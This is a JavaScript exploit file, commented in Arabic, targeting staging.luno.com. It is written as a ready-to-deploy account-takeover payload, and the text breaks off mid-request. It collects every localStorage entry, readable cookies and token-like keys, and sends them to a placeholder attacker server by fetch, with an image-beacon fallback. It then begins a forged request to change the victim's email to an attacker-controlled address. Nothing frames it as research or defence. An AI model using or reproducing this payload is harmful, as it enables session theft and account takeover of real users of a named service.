// exploit.js - Full Account Takeover via Missing CSP on staging.luno.com
(function() {
    // 1. جمع كل بيانات localStorage
    let localStorageData = {};
    for (let i = 0; i < localStorage.length; i++) {
        let key = localStorage.key(i);
        localStorageData[key] = localStorage.getItem(key);
    }

    // 2. جمع الكوكيات (إذا لم تكن HttpOnly)
    let cookies = document.cookie;

    // 3. محاولة العثور على معرّفات جلسة محتملة
    let potentialTokens = {};
    for (let key in localStorageData) {
        if (key.toLowerCase().includes('token') || 
            key.toLowerCase().includes('session') || 
            key.toLowerCase().includes('user') ||
            key.toLowerCase().includes('id')) {
            potentialTokens[key] = localStorageData[key];
        }
    }

    // 4. بناء جسم الهجوم
    const exfiltrationData = {
        url: window.location.href,
        localStorage: localStorageData,
        cookies: cookies,
        potentialTokens: potentialTokens,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
    };

    // 5. إرسال البيانات إلى خادمك (يجب أن يكون HTTPS)
    // ⚠️ غيّر الرابط التالي إلى خادمك الخاص
    const attackerEndpoint = 'https://your-server.com/capture';

    fetch(attackerEndpoint, {
        method: 'POST',
        mode: 'no-cors', // لتجاوز CORS (حتى لو رُفض الطلب، البيانات قد تُرسل في بعض الحالات)
        keepalive: true,
        body: JSON.stringify(exfiltrationData)
    }).catch(() => {
        // محاولة بديلة عبر <img> إذا فشل fetch
        let img = new Image();
        img.src = attackerEndpoint + '?data=' + btoa(JSON.stringify(exfiltrationData));
    });

    // 6. (اختياري) محاولة تغيير البريد الإلكتروني تلقائيًا
    // --- ابحث عن API endpoint فعلي في network tab ---
    // مثال افتراضي (يجب تعديله حسب الواقع):
    if (potentialTokens['lunoSession'] || potentialTokens['userId']) {
        const changeEmailPayload = {
            newEmail: "attacker+test@yourdomain.com", // بريد خبيث تحت سيطرتك
            userId: potentialTokens['userId'] || Object.values(potentialTokens)[0]
        };

        // محاولة إرسال طلب تغيير البريد
        fetch('https://www.staging.luno.com/api/user/email/change', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                // أضف الرؤوس المطلوبة (مثل x-device-id) إذا وجدت
                ...
